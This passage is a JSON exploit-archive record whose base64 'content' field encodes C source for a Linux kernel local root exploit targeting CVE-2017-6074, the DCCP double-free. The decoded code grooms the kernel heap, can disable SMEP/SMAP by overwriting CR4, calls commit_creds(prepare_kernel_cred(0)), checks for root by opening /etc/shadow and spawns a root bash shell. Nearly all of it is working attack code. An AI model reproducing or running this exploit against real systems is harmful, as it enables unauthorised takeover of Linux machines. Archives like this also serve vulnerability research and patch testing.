19rbWFsbG9jX3NtYWxsKCZ1aDQpOw0KDQoJcHJpbnRmKCJbLl0gd2FpdGluZyBmb3IgdGhlIHRpbWVyIHRvIGV4ZWN1dGVcbiIpOw0KDQoJZGVidWcoIndhaXQiKTsNCglzbGVlcCgxKTsNCg0KCXByaW50ZigiWy5dIGRvbmVcbiIpOw0KfQ0KDQp2b2lkIGRpc2FibGVfc21lcF9zbWFwKCkgew0KCXByaW50ZigiWy5dIGRpc2FibGluZyBTTUVQICYgU01BUFxuIik7DQoJa2VybmVsX2V4ZWNfaXJxKCh2b2lkICopTkFUSVZFX1dSSVRFX0NSNCwgQ1I0X0RFU0lSRURfVkFMVUUpOw0KCXByaW50ZigiWy5dIFNNRVAgJiBTTUFQIHNob3VsZCBiZSBvZmYgbm93XG4iKTsNCn0NCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogR2V0dGluZyByb290ICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQovLyBFeGVjdXRlcyBmdW5jKCkgZnJvbSBwcm9jZXNzIGNvbnRleHQuDQp2b2lkIGtlcm5lbF9leGVjKHZvaWQgKmZ1bmMpIHsNCglpbnQgaTsNCglzdHJ1Y3QgZGNjcF9oYW5kbGUgZGg7DQoJc3RydWN0IHVkcF9maWZvX2hhbmRsZSB1aDEsIHVoMiwgdWgzOw0KCWNoYXIgZHVtbXlbMjA0OF07DQoJY2hhciBidWZmZXJbMjA0OF07DQoNCglwcmludGYoIlsuXSBleGVjdXRpbmcgJXBcbiIsIGZ1bmMpOw0KDQoJbWVtc2V0KCZkdW1teVswXSwgMCwgMjA0OCk7DQoJaW5pdF9za2JfYnVmZmVyKCZidWZmZXJbMF0sIGZ1bmMpOw0KDQoJdWRwX2ZpZm9faW5pdCgmdWgxKTsNCgl1ZHBfZmlmb19pbml0KCZ1aDIpOw0KCXVkcF9maWZvX2luaXQoJnVoMyk7DQoNCglkZWJ1Zygia21hbGxvYyBwYWQiKTsNCglrbWFsbG9jX3BhZCgpOw0KDQoJZGVidWcoImttYWxsb2Mgd2FybSIpOw0KCWttYWxsb2Nfd2FybSgpOw0KDQoJZGVidWcoImRjY3AgaW5pdCIpOw0KCWRjY3BfaW5pdCgmZGgsIHBvcnQrKyk7DQoNCglkZWJ1ZygiZGNjcCBrbWFsbG9jIGtmcmVlIik7DQoJZGNjcF9rbWFsbG9jX2tmcmVlKCZkaCk7DQoNCglkZWJ1ZygiY2F0Y2ggMSIpOw0KCWZvciAoaSA9IDA7IGkgPCBDQVRDSF9GSVJTVDsgaSsrKQ0KCQl1ZHBfZmlmb19rbWFsbG9jKCZ1aDEsICZkdW1teVswXSk7DQoNCglkZWJ1ZygiZGNjcCBrZnJlZSBhZ2FpbjoiKTsNCglkY2NwX2tmcmVlX2FnYWluKCZkaCk7DQoNCglkZWJ1ZygiY2F0Y2ggMiIpOw0KCWZvciAoaSA9IDA7IGkgPCBDQVRDSF9GSVJTVDsgaSsrKQ0KCQl1ZHBfZmlmb19rbWFsbG9jKCZ1aDIsICZkdW1teVswXSk7DQoNCglkZWJ1ZygiY2F0Y2ggMSAtPiBvdmVyd3JpdGUiKTsNCglmb3IgKGkgPSAwOyBpIDwgQ0FUQ0hfRklSU1Q7IGkrKykgew0KCQl1ZHBfZmlmb19rZnJlZSgmdWgxKTsNCgkJc2VuZG1tc2dfa21hbGxvY19rZnJlZShwb3J0KyssICZidWZmZXJbMF0pOw0KCX0NCglkZWJ1ZygiY2F0Y2ggMiAtPiBmcmVlICYgdHJpZ2dlciIpOw0KCWZvciAoaSA9IDA7IGkgPCBDQVRDSF9GSVJTVDsgaSsrKQ0KCQl1ZHBfZmlmb19rZnJlZSgmdWgyKTsNCg0KCWRlYnVnKCJjYXRjaCAxICYgMiIpOw0KCWZvciAoaSA9IDA7IGkgPCBDQVRDSF9BR0FJTjsgaSsrKQ0KCQl1ZHBfZmlmb19rbWFsbG9jKCZ1aDMsICZkdW1teVswXSk7DQoNCglwcmludGYoIlsuXSBkb25lXG4iKTsNCn0NCg0KdHlwZWRlZiBpbnQgX19hdHRyaWJ1dGVfXygocmVncGFybSgzKSkpICgqIF9jb21taXRfY3JlZHMpKHVuc2lnbmVkIGxvbmcgY3JlZCk7DQp0eXBlZGVmIHVuc2lnbmVkIGxvbmcgX19hdHRyaWJ1dGVfXygocmVncGFybSgzKSkpICgqIF9wcmVwYXJlX2tlcm5lbF9jcmVkKSh1bnNpZ25lZCBsb25nIGNyZWQpOw0KDQpfY29tbWl0X2NyZWRzIGNvbW1pdF9jcmVkcyA9IChfY29tbWl0X2NyZWRzKUNPTU1JVF9DUkVEUzsNCl9wcmVwYXJlX2tlcm5lbF9jcmVkIHByZXBhcmVfa2VybmVsX2NyZWQgPSAoX3ByZXBhcmVfa2VybmVsX2NyZWQpUFJFUEFSRV9LRVJORUxfQ1JFRDsNCg0Kdm9pZCBnZXRfcm9vdF9wYXlsb2FkKHZvaWQpIHsNCgljb21taXRfY3JlZHMocHJlcGFyZV9rZXJuZWxfY3JlZCgwKSk7DQp9DQoNCnZvaWQgZ2V0X3Jvb3QoKSB7DQoJcHJpbnRmKCJbLl0gZ2V0dGluZyByb290XG4iKTsNCglrZXJuZWxfZXhlYygmZ2V0X3Jvb3RfcGF5bG9hZCk7DQoJcHJpbnRmKCJbLl0gc2hvdWxkIGJlIHJvb3Qgbm93XG4iKTsNCn0NCg0KLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqIE1haW4gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0Kdm9pZCBleGVjX3NoZWxsKCkgew0KCWNoYXIgKnNoZWxsID0gIi9iaW4vYmFzaCI7DQoJY2hhciAqYXJnc1tdID0ge3NoZWxsLCAiLWkiLCBOVUxMfTsNCglleGVjdmUoc2hlbGwsIGFyZ3MsIE5VTEwpOw0KfQ0KDQp2b2lkIGZvcmtfc2hlbGwoKSB7DQoJcGlkX3QgcnY7DQoNCglydiA9IGZvcmsoKTsNCglpZiAocnYgPT0gLTEpIHsNCgkJcGVycm9yKCJmb3JrKCkiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCg0KCWlmIChydiA9PSAwKSB7DQoJCWV4ZWNfc2hlbGwoKTsNCgl9DQp9DQoNCmJvb2wgaXNfcm9vdCgpIHsNCgkvLyBXZSBjYW4ndCBzaW1wbGUgY2hlY2sgdWlkLCBzaW5jZSB3ZSdyZSBydW5uaW5nIGluc2lkZSBhIG5hbWVzcGFjZQ0KCS8vIHdpdGggdWlkIHNldCB0byAwLiBUcnkgb3BlbmluZyAvZXRjL3NoYWRvdyBpbnN0ZWFkLg0KCWludCBmZCA9IG9wZW4oIi9ldGMvc2hhZG93IiwgT19SRE9OTFkpOw0KCWlmIChmZCA9PSAtMSkNCgkJcmV0dXJuIGZhbHNlOw0KCWNsb3NlKGZkKTsNCglyZXR1cm4gdHJ1ZTsNCn0NCg0Kdm9pZCBjaGVja19yb290KCkgew0KCXByaW50ZigiWy5dIGNoZWNraW5nIGlmIHdlIGdvdCByb290XG4iKTsNCg0KCWlmICghaXNfcm9vdCgpKSB7DQoJCXByaW50ZigiWy1dIHNvbWV0aGluZyB3ZW50IHdyb25nID0oXG4iKTsNCgkJcHJpbnRmKCJbIV0gZG9uJ3Qga2lsbCB0aGUgZXhwbG9pdCBiaW5hcnksIHRoZSBrZXJuZWwgd2lsbCBjcmFzaFxuIik7DQoJCXJldHVybjsNCgl9DQoNCglwcmludGYoIlsrXSBnb3QgcjAwdCBeX15cbiIpOw0KCXByaW50ZigiWyFdIGRvbid0IGtpbGwgdGhlIGV4cGxvaXQgYmluYXJ5LCB0aGUga2VybmVsIHdpbGwgY3Jhc2hcbiIpOw0KDQoJLy8gRm9yayBhbmQgZXhlYyBpbnN0ZWFkIG9mIGp1c3QgZG9pbmcgdGhlIGV4ZWMgdG8gYXZvaWQgZnJlZWluZw0KCS8vIHNrYnVmZnMgYW5kIHByZXZlbnQgY3Jhc2hlcyBkdWUgdG8gYSBhbGxvY2F0b3IgY29ycnVwdGlvbi4NCglmb3JrX3NoZWxsKCk7DQp9DQoNCnN0YXRpYyBib29sIHdyaXRlX2ZpbGUoY29uc3QgY2hhciogZmlsZSwgY29uc3QgY2hhciogd2hhdCwgLi4uKQ0Kew0KCWNoYXIgYnVmWzEwMjRdOw0KCXZhX2xpc3QgYXJnczsNCgl2YV9zdGFydChhcmdzLCB3aGF0KTsNCgl2c25wcmludGYoYnVmLCBzaXplb2YoYnVmKSwgd2hhdCwgYXJncyk7DQoJdmFfZW5kKGFyZ3MpOw0KCWJ1ZltzaXplb2YoYnVmKSAtIDFdID0gMDsNCglpbnQgbGVuID0gc3RybGVuKGJ1Zik7DQoNCglpbnQgZmQgPSBvcGVuKGZpbGUsIE9fV1JPTkxZIHwgT19DTE9FWEVDKTsNCglpZiAoZmQgPT0gLTEpDQoJCXJldHVybiBmYWxzZTsNCglpZiAod3JpdGUoZmQsIGJ1ZiwgbGVuKSAhPSBsZW4pIHsNCgkJY2xvc2UoZmQpOw0KCQlyZXR1cm4gZmFsc2U7DQoJfQ0KCWNsb3NlKGZkKTsNCglyZXR1cm4gdHJ1ZTsNCn0NCg0Kdm9pZCBzZXR1cF9zYW5kYm94KCkgew0KCWludCByZWFsX3VpZCA9IGdldHVpZCgpOw0KCWludCByZWFsX2dpZCA9IGdldGdpZCgpOw0KDQogICAgICAgIGlmICh1bnNoYXJlKENMT05FX05FV1VTRVIpICE9IDApIHsNCgkJcGVycm9yKCJ1bnNoYXJlKENMT05FX05FV1VTRVIpIik7DQoJCWV4aXQoRVhJVF9GQUlMVVJFKTsNCgl9DQoNCiAgICAgICAgaWYgKHVuc2hhcmUoQ0xPTkVfTkVXTkVUKSAhPSAwKSB7DQoJCXBlcnJvcigidW5zaGFyZShDTE9ORV9ORVdVU0VSKSIpOw0KCQlleGl0KEVYSVRfRkFJTFVSRSk7DQoJfQ0KDQoJaWYgKCF3cml0ZV9maWxlKCIvcHJvYy9zZWxmL3NldGdyb3VwcyIsICJkZW55IikpIHsNCgkJcGVycm9yKCJ3cml0ZV9maWxlKC9wcm9jL3NlbGYvc2V0X2dyb3VwcykiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCglpZiAoIXdyaXRlX2ZpbGUoIi9wcm9jL3NlbGYvdWlkX21hcCIsICIwICVkIDFcbiIsIHJlYWxfdWlkKSl7DQoJCXBlcnJvcigid3JpdGVfZmlsZSgvcHJvYy9zZWxmL3VpZF9tYXApIik7DQoJCWV4aXQoRVhJVF9GQUlMVVJFKTsNCgl9DQoJaWYgKCF3cml0ZV9maWxlKCIvcHJvYy9zZWxmL2dpZF9tYXAiLCAiMCAlZCAxXG4iLCByZWFsX2dpZCkpIHsNCgkJcGVycm9yKCJ3cml0ZV9maWxlKC9wcm9jL3NlbGYvZ2lkX21hcCkiKTsNCgkJZXhpdChFWElUX0ZBSUxVUkUpOw0KCX0NCg0KCWNwdV9zZXRfdCBteV9zZXQ7DQoJQ1BVX1pFUk8oJm15X3NldCk7DQoJQ1BVX1NFVCgwLCAmbXlfc2V0KTsNCglpZiAoc2NoZWRfc2V0YWZmaW5pdHkoMCwgc2l6ZW9mKG15X3NldCksICZteV9zZXQpICE9IDApIHsNCgkJcGVycm9yKCJzY2hlZF9zZXRhZmZpbml0eSgpIik7DQoJCWV4aXQoRVhJVF9GQUlMVVJFKTsNCgl9DQoNCglpZiAoc3lzdGVtKCIvc2Jpbi9pZmNvbmZpZyBsbyB1cCIpICE9IDApIHsNCgkJcGVycm9yKCJzeXN0ZW0oL3NiaW4vaWZjb25maWcgbG8gdXApIik7DQoJCWV4aXQoRVhJVF9GQUlMVVJFKTsNCgl9DQoNCglwcmludGYoIlsuXSBuYW1lc3BhY2Ugc2FuZGJveCBzZXR1cCBzdWNjZXNzZnVsbHlcbiIpOw0KfQ0KDQppbnQgbWFpbigpIHsNCglzZXR1cF9zYW5kYm94KCk7DQoNCiNpZiBTTUVQX1NNQVBfQllQQVNTDQoJZGlzYWJsZV9zbWVwX3NtYXAoKTsNCiNlbmRpZg0KDQoJZ2V0X3Jvb3QoKTsNCg0KCWNoZWNrX3Jvb3QoKTsNCg0KCXdoaWxlICh0cnVlKSB7DQoJCXNsZWVwKDEwMCk7DQoJfQ0KDQoJcmV0dXJuIDA7DQp9", 
    "filename": "platforms/linux/local/41458.c", 
    "id": "41458", 
    "cves": [
        "CVE-2017-6074"
    ]
}